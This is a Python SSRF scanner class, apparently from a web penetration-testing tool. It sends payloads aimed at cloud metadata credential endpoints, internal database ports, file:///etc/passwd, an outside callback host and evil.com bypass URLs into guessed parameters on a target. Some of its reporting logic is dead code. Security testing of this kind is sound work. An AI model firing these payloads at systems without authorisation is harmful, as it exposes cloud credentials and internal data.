import requests
from urllib.parse import urlparse, urljoin
import time
import re

class SSRFScanner:
    def __init__(self, url, args):
        self.url = url.rstrip('/')
        self.args = args
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0'
        })
        
        if args.proxy:
            self.session.proxies = {'http': args.proxy, 'https': args.proxy}
        
        self.results = []
        self.callback_server = None  # For external interaction (e.g., Burp collaborator)
    
    def find_ssrf_vectors(self):
        """Find potential SSRF vectors in the page"""
        vectors = []
        
        # URL parameters that might be SSRF vectors
        param_patterns = [
            'url', 'uri', 'path', 'dest', 'redirect', 'return', 'returnTo',
            'return_to', 'next', 'next_url', 'target', 'load', 'read',
            'file', 'document', 'folder', 'root', 'download', 'source',
            'image', 'img', 'image_url', 'img_url', 'avatar', 'profile_pic',
            'link', 'href', 'src', 'data', 'page', 'include', 'import',
            'fetch', 'proxy', 'location', 'endpoint', 'api_url',
            'webhook', 'callback', 'notify_url', 'postback', 'confirm',
            'validate', 'verify_url', 'reference', 'affiliate'
        ]
        
        # Check URL parameters
        parsed = urlparse(self.url)
        if parsed.query:
            for param in parsed.query.split('&'):
                if '=' in param:
                    key, val = param.split('=', 1)
                    if any(pattern in key.lower() for pattern in param_patterns):
                        vectors.append({
                            'url': self.url,
                            'param': key,
                            'method': 'GET',
                            'current_value': val
                        })
        
        # Common SSRF endpoints to test
        ssrf_endpoints = [
            '/fetch', '/proxy', '/load', '/image', '/img',
            '/api/fetch', '/api/proxy', '/api/load',
            '/download', '/file', '/read', '/get',
            '/external', '/webhook', '/callback'
        ]
        
        for endpoint in ssrf_endpoints:
            test_url = urljoin(self.url, endpoint)
            vectors.append({
                'url': test_url,
                'param': 'url',
                'method': 'GET',
                'type': 'endpoint'
            })
        
        return vectors
    
    def test_ssrf(self, vector):
        """Test for SSRF vulnerability"""
        # Test URLs - different protocols and targets
        test_urls = [
            # Internal network tests (non-destructive)
            'http://127.0.0.1:80',
            'http://127.0.0.1:8080',
            'http://127.0.0.1:3000',
            'http://localhost',
            'http://[::1]:80',
            'http://0.0.0.0:80',
            # Cloud metadata endpoints
            'http://169.254.169.254/latest/meta-data/',
            'http://169.254.169.254/latest/user-data/',
            'http://metadata.google.internal/',
            'http://100.100.100.200/latest/meta-data/',
            # Internal services
            'http://127.0.0.1:6379',  # Redis
            'http://127.0.0.1:27017', # MongoDB
            'http://127.0.0.1:9200',  # Elasticsearch
            'http://127.0.0.1:5432',  # PostgreSQL
            'http://127.0.0.1:3306',  # MySQL
            # File protocol (LFI via SSRF)
            'file:///etc/passwd',
            'file:///etc/hosts',
            # DNS exfiltration
            'http://burpcollaborator.net/test',
            # Redirect bypass
            'http://127.0.0.1#@evil.com',
            'http://evil.com@127.0.0.1',
            # IPv6 localhost
            'http://[0:0:0:0:0:ffff:127.0.0.1]',
            # Decimal IP bypass
            'http://2130706433/',  # 127.0.0.1 in decimal
            'http://0x7f000001/',  # 127.0.0.1 in hex
        ]
        
        for test_url in test_urls:
            try:
                data = {vector['param']: test_url}
                
                start = time.time()
                if vector.get('method') == 'POST':
                    response = self.session.post(vector['url'], data=data, timeout=8)
                else:
                    response = self.session.get(vector['url'], params=data, timeout=8)
                elapsed = time.time() - start
                
                # Indicators of SSRF
                indicators = {
                    'cloud_metadata': ['ami-id', 'instance-id', 'public-keys', 'security-credentials',
                                      'meta-data', 'user-data', 'project/', 'computeMetadata'],
                    'file_read': ['root:', '/bin/bash', 'localhost', '127.0.0.1'],
                    'internal_service': ['redis_version', 'MongoDB', '"ok" : 1', 'cluster_name',
                                        'Elasticsearch', 'database', 'PostgreSQL'],
                    'connection_error': ['Connection refused', 'could not connect', 'timeout']
                }
                
                for indicator_type, patterns in indicators.items():
                    if any(p in response.text for p in patterns):
                        self.results.append({
                            'url': vector['url'],
                            'param': vector['param'],
                            'technique': f'SSRF - {indicator_type.replace("_", " ").title()}',
                            'payload': test_url[:100],
                            'confidence': 'High',
                            'evidence': f"Detected '{list(filter(lambda p: p in response.text, patterns))[0]}' in response",
                            'remediation': 'Implement URL allow-list, block private IP ranges, use URL parsing libraries'
                        })
                        return
                
                # Time-based SSRF (check if response time correlates with target)
                if 'sleep' in test_url and elapsed > 3:
                    self.results.append({
                        'url': vector['url'],
                        'param': vector['param'],
                        'technique': 'SSRF - Time-based',
                        'payload': test_url[:100],
                        'confidence': 'Medium',
                        'evidence': f"Response took {elapsed:.2f}s (expected delay target)",
                        'remediation': 'Block outbound connections to arbitrary hosts'
                    })
                    return
                    
            except requests.Timeout:
                # Timeout might also indicate SSRF (server is trying to connect)
                if '127.0.0.1' in test_url or 'localhost' in test_url:
                    self.results.append({
                        'url': vector['url'],
                        'param': vector['param'],
                        'technique': 'SSRF - Potential (Timeout)',
                        'payload': test_url[:100],
                        'confidence': 'Low',
                        'evidence': f'Request timed out when targeting {test_url[:50]}',
                        'remediation': 'Investigate whether server is making outbound connections'
                    })
            except Exception:
                continue
        
        return None
    
    def scan(self):
        """Main SSRF scan"""
        print("    [*] Finding SSRF vectors...")
        
        vectors = self.find_ssrf_vectors()
        
        if not vectors:
            print("    [!] No SSRF vectors found")
            return self.results
        
        print(f"    [*] Testing {len(vectors)} potential SSRF vectors...")
        print("    [*] Testing cloud metadata, internal IPs, file:// protocol...")
        
        for vector in vectors:
            result = self.test_ssrf(vector)
            if result:
                print(f"    [!] {result['technique']}")
                print(f"       Payload: {result['payload'][:80]}")
        
        if self.results:
            print(f"    [!] Found {len(self.results)} SSRF vulnerabilities")
        else:
            print("    [+] No SSRF vulnerabilities detected")
        
        return self.results